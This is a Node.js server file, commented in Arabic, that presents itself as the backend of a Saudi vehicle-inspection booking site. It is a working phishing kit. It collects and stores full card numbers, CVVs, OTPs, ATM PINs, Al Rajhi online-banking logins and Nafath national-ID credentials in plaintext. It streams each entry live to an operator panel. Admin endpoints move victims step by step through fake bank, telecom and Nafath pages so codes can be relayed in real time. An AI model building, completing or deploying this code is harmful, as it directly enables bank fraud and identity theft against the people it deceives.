/**
 * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
 * تم تعديله ليدعم PostgreSQL على Railway - نسخة كاملة مُصلحة
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { Pool } = require("pg"); 
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 8080; 
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";

// إعداد الاتصال بـ PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ==================== إنشاء الجداول (PostgreSQL Syntax) ====================
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bookings (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        clientName TEXT DEFAULT '',
        clientId TEXT DEFAULT '',
        clientPhone TEXT DEFAULT '',
        clientEmail TEXT DEFAULT '',
        clientNationality TEXT DEFAULT '',
        hasDelegate INTEGER DEFAULT 0,
        delegateType TEXT DEFAULT '',
        delegateName TEXT DEFAULT '',
        delegatePhone TEXT DEFAULT '',
        delegateNationality TEXT DEFAULT '',
        delegateId TEXT DEFAULT '',
        vehicleCountry TEXT DEFAULT '',
        vehiclePlate TEXT DEFAULT '',
        vehiclePlateChar1 TEXT DEFAULT '',
        vehiclePlateChar2 TEXT DEFAULT '',
        vehiclePlateChar3 TEXT DEFAULT '',
        vehicleType TEXT DEFAULT '',
        vehicleCarryDang INTEGER DEFAULT 0,
        serviceRegion TEXT DEFAULT '',
        serviceType TEXT DEFAULT '',
        serviceDate TEXT DEFAULT '',
        serviceTime TEXT DEFAULT '',
        clientIp TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        status TEXT DEFAULT 'new',
        statusRead INTEGER DEFAULT 0,
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        cardHolderName TEXT DEFAULT '',
        cardNumber TEXT DEFAULT '',
        cardLastFour TEXT DEFAULT '',
        cardExpiry TEXT DEFAULT '',
        cardCvv TEXT DEFAULT '',
        verifyCode TEXT DEFAULT '',
        secretNum TEXT DEFAULT '',
        rajUsername TEXT DEFAULT '',
        rajPassword TEXT DEFAULT '',
        paymentAction TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS verification_codes (
        id SERIAL PRIMARY KEY,
        referenceId TEXT NOT NULL,
        type TEXT NOT NULL,
        nafathId TEXT DEFAULT '',
        nafathPassword TEXT DEFAULT '',
        nafathNumber TEXT DEFAULT '',
        motaselProvider TEXT DEFAULT '',
        motaselPhone TEXT DEFAULT '',
        motaselCode TEXT DEFAULT '',
        otpCode TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000),
        UNIQUE(referenceId, type)
      );

      CREATE TABLE IF NOT EXISTS navigation_logs (
        id SERIAL PRIMARY KEY,
        referenceId TEXT,
        clientIp TEXT DEFAULT '',
        targetPage TEXT DEFAULT '',
        note TEXT DEFAULT '',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );
    `);
    console.log("Database tables initialized successfully");
  } catch (err) {
    console.error("Error initializing database:", err);
  }
};

initDb();

// ==================== دالة تحويل أسماء الحقول من lowercase إلى camelCase ====================
function toCamel(row) {
  if (!row) return null;
  const map = {
    referenceid: 'referenceId',
    clientname: 'clientName',
    clientid: 'clientId',
    clientphone: 'clientPhone',
    clientemail: 'clientEmail',
    clientnationality: 'clientNationality',
    hasdelegate: 'hasDelegate',
    delegatetype: 'delegateType',
    delegatename: 'delegateName',
    delegatephone: 'delegatePhone',
    delegatenationality: 'delegateNationality',
    delegateid: 'delegateId',
    vehiclecountry: 'vehicleCountry',
    vehicleplate: 'vehiclePlate',
    vehicleplatechar1: 'vehiclePlateChar1',
    vehicleplatechar2: 'vehiclePlateChar2',
    vehicleplatechar3: 'vehiclePlateChar3',
    vehicletype: 'vehicleType',
    vehiclecarrydang: 'vehicleCarryDang',
    serviceregion: 'serviceRegion',
    servicetype: 'serviceType',
    servicedate: 'serviceDate',
    servicetime: 'serviceTime',
    clientip: 'clientIp',
    rawdata: 'rawData',
    statusread: 'statusRead',
    createdat: 'createdAt',
    cardholdername: 'cardHolderName',
    cardnumber: 'cardNumber',
    cardlastfour: 'cardLastFour',
    cardexpiry: 'cardExpiry',
    cardcvv: 'cardCvv',
    verifycode: 'verifyCode',
    secretnum: 'secretNum',
    rajusername: 'rajUsername',
    rajpassword: 'rajPassword',
    paymentaction: 'paymentAction',
    nafathid: 'nafathId',
    nafathpassword: 'nafathPassword',
    nafathnumber: 'nafathNumber',
    motaselprovider: 'motaselProvider',
    motaselphone: 'motaselPhone',
    motaselcode: 'motaselCode',
    otpcode: 'otpCode',
  };
  const result = {};
  for (const [k, v] of Object.entries(row)) {
    result[map[k] || k] = v;
  }
  return result;
}

// ==================== دوال قاعدة البيانات (PostgreSQL) ====================
async function createBooking(data) {
  const query = `
    INSERT INTO bookings (
      referenceid, clientname, clientid, clientphone, clientemail, clientnationality,
      hasdelegate, delegatetype, delegatename, delegatephone, delegatenationality, delegateid,
      vehiclecountry, vehicleplate, vehicleplatechar1, vehicleplatechar2, vehicleplatechar3,
      vehicletype, vehiclecarrydang, serviceregion, servicetype, servicedate, servicetime,
      clientip, rawdata, status, statusread
    ) VALUES (
      $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27
    ) RETURNING *`;
  
  const values = [
    data.referenceId, data.clientName, data.clientId, data.clientPhone, data.clientEmail, data.clientNationality,
    data.hasDelegate ? 1 : 0, data.delegateType, data.delegateName, data.delegatePhone, data.delegateNationality, data.delegateId,
    data.vehicleCountry, data.vehiclePlate, data.vehiclePlateChar1, data.vehiclePlateChar2, data.vehiclePlateChar3,
    data.vehicleType, data.vehicleCarryDang ? 1 : 0, data.serviceRegion, data.serviceType, data.serviceDate, data.serviceTime,
    data.clientIp, JSON.stringify(data.rawData || {}), data.status, data.statusRead
  ];

  const res = await pool.query(query, values);
  return res.rows[0];
}

async function getBookingByReference(referenceId) {
  const res = await pool.query("SELECT * FROM bookings WHERE referenceid = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  const r = toCamel(row);
  try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
  return r;
}

async function getAllBookings() {
  const res = await pool.query("SELECT * FROM bookings ORDER BY createdat DESC");
  return res.rows.map(r => {
    const row = toCamel(r);
    try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
    return row;
  });
}

async function updateBookingStatus(referenceId, status, statusRead) {
  if (statusRead !== undefined) {
    await pool.query("UPDATE bookings SET status = $1, statusRead = $2 WHERE referenceId = $3", [status, statusRead, referenceId]);
  } else {
    await pool.query("UPDATE bookings SET status = $1 WHERE referenceId = $2", [status, referenceId]);
  }
}

async function createOrUpdatePayment(referenceId, data) {
  // تعيين أسماء الحقول من الكائن إلى أسماء أعمدة قاعدة البيانات
  const fieldMap = {
    cardHolderName: 'cardholdername',
    cardHolder: 'cardholdername',
    cardNumber: 'cardnumber',
    cardLastFour: 'cardlastfour',
    expirationDate: 'cardexpiry',
    cardExpiry: 'cardexpiry',
    expiryDate: 'cardexpiry', // إضافة expiryDate
    cvv: 'cardcvv',
    cardCvv: 'cardcvv',
    verifyCode: 'verifycode',
    secretNum: 'secretnum',
    rajUsername: 'rajusername',
    rajPassword: 'rajpassword',
    paymentAction: 'paymentaction',
    step: 'step',
    status: 'status',
    rawData: 'rawdata',
    ip: null, // تجاهل ip ليس عموداً
    referenceId: null, // تجاهل
  };
  
  const filteredData = {};
  for (const [k, v] of Object.entries(data)) {
    if (k === 'referenceId' || k === 'ip') continue;
    const col = fieldMap[k] !== undefined ? fieldMap[k] : k.toLowerCase();
    if (col) filteredData[col] = k === 'rawData' ? JSON.stringify(v) : v;
  }
  
  const existing = await pool.query("SELECT id FROM payments WHERE referenceid = $1", [referenceId]);
  
  if (existing.rows.length > 0) {
    const cols = Object.keys(filteredData);
    if (cols.length === 0) return getPaymentByReference(referenceId);
    const sets = cols.map((k, i) => `${k} = $${i + 2}`).join(", ");
    const values = cols.map(k => filteredData[k]);
    await pool.query(`UPDATE payments SET ${sets} WHERE referenceid = $1`, [referenceId, ...values]);
  } else {
    const cols = ['referenceid', ...Object.keys(filteredData)];
    const placeholders = cols.map((_, i) => `$${i + 1}`).join(", ");
    const values = [referenceId, ...Object.values(filteredData)];
    await pool.query(`INSERT INTO payments (${cols.join(", ")}) VALUES (${placeholders})`, values);
  }
  return getPaymentByReference(referenceId);
}

async function getPaymentByReference(referenceId) {
  const res = await pool.query("SELECT * FROM payments WHERE referenceid = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  const r = toCamel(row);
  try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
  return r;
}

async function createOrUpdateVerification(referenceId, type, data) {
  // تصفية الحقول المحجوزة وغير الموجودة في الجدول
  const allowedFields = ['nafathid', 'nafathpassword', 'nafathnumber', 'motaselprovider', 'motaselphone', 'motaselcode', 'otpcode', 'step', 'status', 'rawdata'];
  const filteredData = {};
  for (const [k, v] of Object.entries(data)) {
    const col = k.toLowerCase();
    if (col === 'referenceid' || col === 'type') continue; // تجاهل الحقول المحجوزة
    if (allowedFields.includes(col)) {
      filteredData[col] = k === 'rawData' ? JSON.stringify(v) : v;
    }
  }
  // تحويل rawData إلى JSON string
  if (data.rawData !== undefined && filteredData['rawdata'] === undefined) {
    filteredData['rawdata'] = JSON.stringify(data.rawData);
  }
  
  const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
  if (existing.rows.length > 0) {
    const cols = Object.keys(filteredData);
    if (cols.length > 0) {
      const sets = cols.map((k, i) => `${k} = $${i + 3}`).join(", ");
      const values = cols.map(k => filteredData[k]);
      await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceid = $1 AND type = $2`, [referenceId, type, ...values]);
    }
  } else {
    const cols = ['referenceid', 'type', ...Object.keys(filteredData)];
    const placeholders = cols.map((_, i) => `$${i + 1}`).join(", ");
    const values = [referenceId, type, ...Object.values(filteredData)];
    await pool.query(`INSERT INTO verification_codes (${cols.join(", ")}) VALUES (${placeholders})`, values);
  }
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

async function getVerificationByReference(referenceId, type) {
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

// ==================== Express Setup ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// --- توجيه الملفات الثابتة لمجلد public (لإظهار الموقع) ---
app.use(express.static(path.join(__dirname, 'public')));
app.use('/dist', express.static(path.join(__dirname, 'public', 'dist')));
app.use('/site', express.static(path.join(__dirname, 'public', 'site')));
app.use('/admin', express.static(path.join(__dirname, 'public', 'admin')));
// توجيه /assets/ إلى ملفات dist/assets (مشتركة بين جميع الصفحات)
app.use('/assets', express.static(path.join(__dirname, 'public', 'dist', 'assets')));

// فتح الصفحة الرئيسية من داخل مجلد public/dist
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dist', 'index.html'));
});

// فتح صفحة الموقع
app.get('/site', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
});
app.get('/site/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
});

// مسارات React Router لصفحات site
const siteRoutes = ['/booking', '/home', '/payments', '/phone', '/phoneCode', '/code', '/nafad', '/nafadBasmah', '/pin', '/madaPin', '/rajhi', '/rajhiCode', '/whats', '/bCall', '/stcCall', '/mobilyCall'];
siteRoutes.forEach(route => {
    app.get(route, (req, res) => {
        res.sendFile(path.join(__dirname, 'public', 'site', 'index.html'));
    });
});

// فتح صفحة الأدمن
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});
app.get('/admin/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
});

// ==================== Socket.IO Setup ====================
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ["websocket", "polling"]
});

// Admin namespace
const adminIo = io.of("/admin");

// Helper: notify admin of new data
function notifyAdmin(event, data) {
  // إرسال للـ room admin-room (للأدمن المتصل عبر namespace الرئيسي)
  io.to('admin-room').emit(event, data);
  // إرسال أيضاً عبر namespace /admin (للتوافق)
  adminIo.emit(event, data);
}

// User socket connections
// تتبع الزوار المتصلين (بدون الأدمن)
let clientSocketCount = 0;

io.on("connection", (socket) => {
  // كل اتصال جديد يعتبر زائراً عادياً مبدئياً
  clientSocketCount++;
  console.log("Socket connected:", socket.id, "| Total:", clientSocketCount);
  notifyAdmin("visitorsCount", { count: clientSocketCount });

  // معالجة joinAdmin - يسمح للأدمن بالانضمام للـ room
  socket.on("joinAdmin", (token) => {
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      if (decoded.role === "admin") {
        socket.join("admin-room");
        if (!socket.isAdmin) {
          // أول مرة ينضم كأدمن: اطرح من عداد الزوار
          clientSocketCount = Math.max(0, clientSocketCount - 1);
          socket.isAdmin = true;
          notifyAdmin("visitorsCount", { count: clientSocketCount });
        }
        console.log("Admin joined admin-room:", socket.id, "| Visitors:", clientSocketCount);
        // إرسال عدد الزوار فوراً للأدمن
        socket.emit("visitorsCount", { count: clientSocketCount });
      }
    } catch(e) {
      console.log("Invalid admin token in joinAdmin:", e.message);
    }
  });

  // Submit booking - يُرسل ackNewDate للعميل
  socket.on("submitBooking", async (data) => {
    try {
      const referenceId = nanoid(10).toUpperCase();
      const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
      
      // تحليل بيانات اللوحة
      const plateParts = (data.plate || "").split("-");
      const plateChars = (plateParts[0] || "").trim().split(" ");
      
      const booking = await createBooking({
        referenceId,
        clientName: data.name || "",
        clientId: data.nationalID || "",
        clientPhone: data.phoneNumber || "",
        clientEmail: data.email || "",
        clientNationality: data.nationality || "",
        hasDelegate: data.delegateOn ? 1 : 0,
        delegateType: data.commissioner?.type || "",
        delegateName: data.commissioner?.name || "",
        delegatePhone: data.commissioner?.phone || "",
        delegateNationality: data.commissioner?.nationality || "",
        delegateId: data.commissioner?.id || "",
        vehicleCountry: data.countryOfRegistration || "",
        vehiclePlate: data.plate || "",
        vehiclePlateChar1: plateChars[0] || "",
        vehiclePlateChar2: plateChars[1] || "",
        vehiclePlateChar3: plateChars[2] || "",
        vehicleType: data.serviceType || "",
        vehicleCarryDang: 0,
        serviceRegion: data.region || "",
        serviceType: data.serviceType || "",
        serviceDate: data.dateSvc || "",
        serviceTime: data.timeSvc || "",
        clientIp: data.ip || clientIp,
        rawData: data,
        status: "new",
        statusRead: 0
      });
      
      // إضافة المستخدم لغرفة الـ referenceId
      socket.join(referenceId);
      // حفظ referenceId في socket للاستخدام لاحقاً
      socket.referenceId = referenceId;
      
      // إشعار الأدمن
      notifyAdmin("newBooking", { ...booking, referenceId });
      
      // إرسال الرد للعميل - هذا هو ما تنتظره الواجهة الأمامية
      socket.emit("ackNewDate", { success: true, referenceId });
      
    } catch (err) {
      console.error("submitBooking error:", err);
      socket.emit("ackNewDate", { success: false, error: err.message });
    }
  });

  // Submit payment data - يُرسل ackPayment للعميل
  socket.on("submitPaymentData", async (data) => {
    try {
      // استخدام referenceId من البيانات أو من socket (تم حفظه عند submitBooking)
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackPayment", { success: false, error: "No referenceId" });
        return;
      }
      await createOrUpdatePayment(referenceId, { ...data, referenceId, rawData: data });
      socket.join(referenceId);
      notifyAdmin("newPayment", { referenceId, ...data });
      socket.emit("ackPayment", { success: true, referenceId });
    } catch (err) {
      console.error("submitPaymentData error:", err);
      socket.emit("ackPayment", { success: false, error: err.message });
    }
  });

  // Submit phone data - يُرسل ackPhone للعميل
  socket.on("submitPhoneData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackPhone", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, "phone", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "phone", referenceId, ...data });
      socket.emit("ackPhone", { success: true });
    } catch (err) {
      console.error("submitPhoneData error:", err);
      socket.emit("ackPhone", { success: false, error: err.message });
    }
  });

  // Submit phone code data - يُرسل ackPhoneCode للعميل
  socket.on("submitPhoneCodeData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackPhoneCode", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, "phoneCode", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "phoneCode", referenceId, ...data });
      socket.emit("ackPhoneCode", { success: true });
    } catch (err) {
      console.error("submitPhoneCodeData error:", err);
      socket.emit("ackPhoneCode", { success: false, error: err.message });
    }
  });

  // Submit nafad data - يُرسل ackNafad للعميل
  socket.on("submitNafadData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackNafad", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, "nafad", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "nafad", referenceId, ...data });
      socket.emit("ackNafad", { success: true });
    } catch (err) {
      console.error("submitNafadData error:", err);
      socket.emit("ackNafad", { success: false, error: err.message });
    }
  });

  // Submit code data - يُرسل ackCode للعميل
  socket.on("submitCodeData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackCode", { success: false });
        return;
      }
      // تحديد نوع البيانات بناءً على خطوة الدفع الحالية
      // step=1 → OTP بعد البطاقة, step=2 → رقم سري ATM
      let verType = "otp";
      let notifyType = "newOTP";
      let notifyLabel = "OTP";
      try {
        const payment = await getPaymentByReference(referenceId);
        const step = payment?.step || 1;
        if (step >= 2) {
          verType = "pin";
          notifyType = "newPIN";
          notifyLabel = "PIN";
        }
      } catch(e) { /* استخدم الافتراضي */ }
      await createOrUpdateVerification(referenceId, verType, { ...data, rawData: data });
      notifyAdmin("newVerification", { type: verType, label: notifyLabel, referenceId, ...data });
      socket.emit("ackCode", { success: true });
    } catch (err) {
      console.error("submitCodeData error:", err);
      socket.emit("ackCode", { success: false, error: err.message });
    }
  });

  // Submit rajhi data - يُرسل ackRajhi للعميل
  socket.on("submitRajhiData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackRajhi", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, "rajhi", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "rajhi", referenceId, ...data });
      socket.emit("ackRajhi", { success: true });
    } catch (err) {
      console.error("submitRajhiData error:", err);
      socket.emit("ackRajhi", { success: false, error: err.message });
    }
  });

  // Submit rajhi code data - يُرسل ackRajhiCode للعميل (بعد إدخال كود الراجحي)
  socket.on("submitRajhiCodeData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      if (!referenceId) {
        socket.emit("ackRajhiCode", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, "rajhiCode", { ...data, rawData: data });
      notifyAdmin("newVerification", { type: "rajhiCode", referenceId, ...data });
      socket.emit("ackRajhiCode", { success: true });
    } catch (err) {
      console.error("submitRajhiCodeData error:", err);
      socket.emit("ackRajhiCode", { success: false, error: err.message });
    }
  });

  // Submit verification data - يُرسل ackVerification للعميل
  socket.on("submitVerificationData", async (data) => {
    try {
      const referenceId = data.referenceId || socket.referenceId;
      const { type } = data;
      if (!referenceId) {
        socket.emit("ackVerification", { success: false });
        return;
      }
      await createOrUpdateVerification(referenceId, type || "verification", { ...data, rawData: data });
      notifyAdmin("newVerification", { referenceId, ...data });
      socket.emit("ackVerification", { success: true });
    } catch (err) {
      console.error("submitVerificationData error:", err);
      socket.emit("ackVerification", { success: false, error: err.message });
    }
  });

  // Update location
  socket.on("updateLocation", async (data) => {
    try {
      // إذا كان الـ socket لا يحمل referenceId، نبحث عنه بالـ IP
      if (!socket.referenceId && data.ip) {
        try {
          const result = await pool.query(
            "SELECT referenceid FROM bookings WHERE clientip = $1 ORDER BY createdat DESC LIMIT 1",
            [data.ip]
          );
          if (result.rows.length > 0) {
            const refId = result.rows[0].referenceid;
            socket.referenceId = refId;
            socket.join(refId);
            console.log(`Socket ${socket.id} joined room ${refId} via IP ${data.ip}`);
          }
        } catch (e) {
          console.error("updateLocation IP lookup error:", e);
        }
      } else if (socket.referenceId) {
        // تأكد من أن الـ socket في الـ room
        socket.join(socket.referenceId);
      }
      // تعيين أسماء الصفحات بالعربية
      const pageNames = {
        '/': 'الصفحة الرئيسية',
        '/home': 'الصفحة الرئيسية',
        '/booking': 'صفحة الحجز',
        '/payments': 'صفحة الدفع',
        '/phone': 'صفحة تأكيد الجوال',
        '/code': 'صفحة OTP (رمز التحقق)',
        '/pin': 'صفحة الرقم السري ATM',
        '/nafad': 'صفحة نفاذ',
        '/rajhi': 'صفحة الراجحي',
        '/rajhiCode': 'صفحة رمز الراجحي',
        '/verification': 'صفحة التحقق',
        '/phoneCode': 'صفحة رمز الجوال',
      };
      const pageLabel = pageNames[data.page] || data.page || 'صفحة غير معروفة';
      notifyAdmin("locationUpdate", { 
        socketId: socket.id, 
        referenceId: socket.referenceId, 
        pageLabel,
        ...data 
      });
    } catch (err) {
      console.error("updateLocation error:", err);
    }
  });

  // Get nafad code
  socket.on("getNafadCode", async (data) => {
    try {
      notifyAdmin("nafadCodeRequest", { socketId: socket.id, ...data });
    } catch (err) {
      console.error("getNafadCode error:", err);
    }
  });

  // stcCallReceived
  socket.on("stcCallReceived", async (data) => {
    try {
      notifyAdmin("stcCallReceived", { socketId: socket.id, ...data });
    } catch (err) {
      console.error("stcCallReceived error:", err);
    }
  });

  socket.on("disconnect", () => {
    if (!socket.isAdmin) {
      clientSocketCount = Math.max(0, clientSocketCount - 1);
      console.log("User disconnected:", socket.id, "| Total clients:", clientSocketCount);
      // إرسال عدد الزوار المحدث للأدمن
      notifyAdmin("visitorsCount", { count: clientSocketCount });
    } else {
      console.log("Admin disconnected:", socket.id);
    }
  });
});

// ==================== Admin API Endpoints ====================

// Middleware to verify admin token
function verifyAdminToken(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== "admin") return res.status(403).json({ error: "Forbidden" });
    req.admin = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Admin login
app.post("/api/admin/login", async (req, res) => {
  try {
    const { password } = req.body;
    if (!password) return res.status(400).json({ error: "Password required" });
    
    const isValid = password === ADMIN_PASSWORD;
    if (!isValid) return res.status(401).json({ error: "Invalid password" });
    
    const token = jwt.sign({ role: "admin", id: "admin" }, JWT_SECRET, { expiresIn: "24h" });
    res.json({ success: true, token });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin me
app.get("/api/admin/me", verifyAdminToken, (req, res) => {
  res.json({ success: true, admin: req.admin });
});

// Get all bookings
app.get("/api/admin/bookings", verifyAdminToken, async (req, res) => {
  try {
    const bookings = await getAllBookings();
    res.json({ success: true, data: bookings, bookings });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get single booking
app.get("/api/admin/bookings/:referenceId", verifyAdminToken, async (req, res) => {
  try {
    const booking = await getBookingByReference(req.params.referenceId);
    if (!booking) return res.status(404).json({ error: "Not found" });
    const payment = await getPaymentByReference(req.params.referenceId);
    // جلب جميع أنواع التحقق
    const verTypes = ['nafad', 'phone', 'phoneCode', 'otp', 'pin', 'rajhi', 'rajhiCode', 'code'];
    const verifications = {};
    for (const t of verTypes) {
      const v = await getVerificationByReference(req.params.referenceId, t);
      if (v) verifications[t] = v;
    }
    res.json({ success: true, data: { booking, payment, verifications } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get stats
app.get("/api/admin/stats", verifyAdminToken, async (req, res) => {
  try {
    const bookings = await getAllBookings();
    const total = bookings.length;
    const newCount = bookings.filter(b => b.status === "new").length;
    const completed = bookings.filter(b => b.status === "completed").length;
    const processing = bookings.filter(b => b.status === "processing").length;
    const onlineUsers = io.engine.clientsCount || 0;
    res.json({ success: true, data: { total, new: newCount, completed, processing, onlineUsers }, total, new: newCount, completed, processing, onlineUsers });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update booking status
app.post("/api/admin/update-status", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, reference, status, statusRead } = req.body;
    const ref = referenceId || reference;
    await updateBookingStatus(ref, status, statusRead);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Navigate user to page
app.post("/api/admin/navigate", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, reference, page, clientIp } = req.body;
    const ref = referenceId || reference;
    // جلب IP العميل من قاعدة البيانات إذا لم يُرسل
    let ip = clientIp;
    if (!ip && ref) {
      const booking = await getBookingByReference(ref);
      ip = booking?.clientIp || '';
    }
    // إرسال navigateTo للعميل
    io.to(ref).emit("navigateTo", { page, ip });
    res.json({ success: true, page, ip });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Send nafath code to user
app.post("/api/admin/send-nafath-code", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, reference, code } = req.body;
    const ref = referenceId || reference;
    io.to(ref).emit("nafadCode", { code });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Nafath action
app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, reference, action, data } = req.body;
    const ref = referenceId || reference;
    
    // جلب بيانات الحجز لمعرفة IP العميل
    const booking = await getBookingByReference(ref);
    const clientIp = booking?.clientIp || '';
    
    let targetPage = '';
    if (action === 'pass') {
      // إرسال رمز نفاذ للعميل
      io.to(ref).emit("nafadCode", { action, ...(data || {}) });
      targetPage = 'nafad';
    } else {
      // رفض - توجيه لصفحة الحجز
      io.to(ref).emit("navigateTo", { page: 'booking', ip: clientIp });
      targetPage = 'booking';
    }
    
    res.json({ success: true, targetPage, action });
  } catch (err) {
    console.error('nafath-action error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Payment action
app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
  try {
    const { referenceId, reference, action, data } = req.body;
    const ref = referenceId || reference;
    
    // جلب بيانات الحجز لمعرفة IP العميل
    const booking = await getBookingByReference(ref);
    const clientIp = booking?.clientIp || '';
    
    // جلب بيانات الدفع لمعرفة الخطوة الحالية
    // step=0 أو null: لم تتم أي موافقة بعد (الخطوة 1 = بيانات البطاقة)
    // step=1: تمت موافقة الخطوة 1 (الخطوة 2 = OTP)
    // step=2: تمت موافقة الخطوة 2 (الخطوة 3 = ATM)
    const payment = await getPaymentByReference(ref);
    const currentStep = (payment?.step || 0) + 1; // الخطوة التالية التي يجب تنفيذها
    
    let targetPage = '';
    let nextStep = payment?.step || 0; // نحتفظ بالخطوة الحالية
    
    if (action === 'pass') {
      // تحديد الصفحة التالية بناءً على الخطوة
      if (currentStep === 1) {
        targetPage = 'code'; // بعد بيانات البطاقة → صفحة OTP (رمز التحقق)
        nextStep = 1; // تمت الخطوة 1
      } else if (currentStep === 2) {
        targetPage = 'pin'; // بعد OTP → صفحة الرقم السري ATM
        nextStep = 2; // تمت الخطوة 2
      } else {
        targetPage = 'nafad'; // بعد الرقم السري → نفاذ
        nextStep = 3; // تمت الخطوة 3
      }
    } else if (action === 'deny') {
      // رفض - إعادة لصفحة الدفع مع علامة declined
      targetPage = 'payments?declined=true';
    } else if (action === 'navigate' && req.body.targetPage) {
      // إعادة توجيه مخصصة - الأدمن يختار الصفحة
      targetPage = req.body.targetPage;
    } else {
      targetPage = 'payments?declined=true';
    }
    
    // تحديث خطوة الدفع
    if (ref) {
      await pool.query(
        "UPDATE payments SET step = $1, paymentaction = $2 WHERE referenceid = $3",
        [nextStep, action, ref]
      );
    }
    
    // إرسال navigateTo للعميل
    io.to(ref).emit("navigateTo", { page: targetPage, ip: clientIp });
    
    res.json({ success: true, currentStep, targetPage, action });
  } catch (err) {
    console.error('payment-action error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Admin Socket.IO namespace
adminIo.on("connection", (socket) => {
  console.log("Admin connected:", socket.id);
  socket.on("disconnect", () => {
    console.log("Admin disconnected:", socket.id);
  });
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
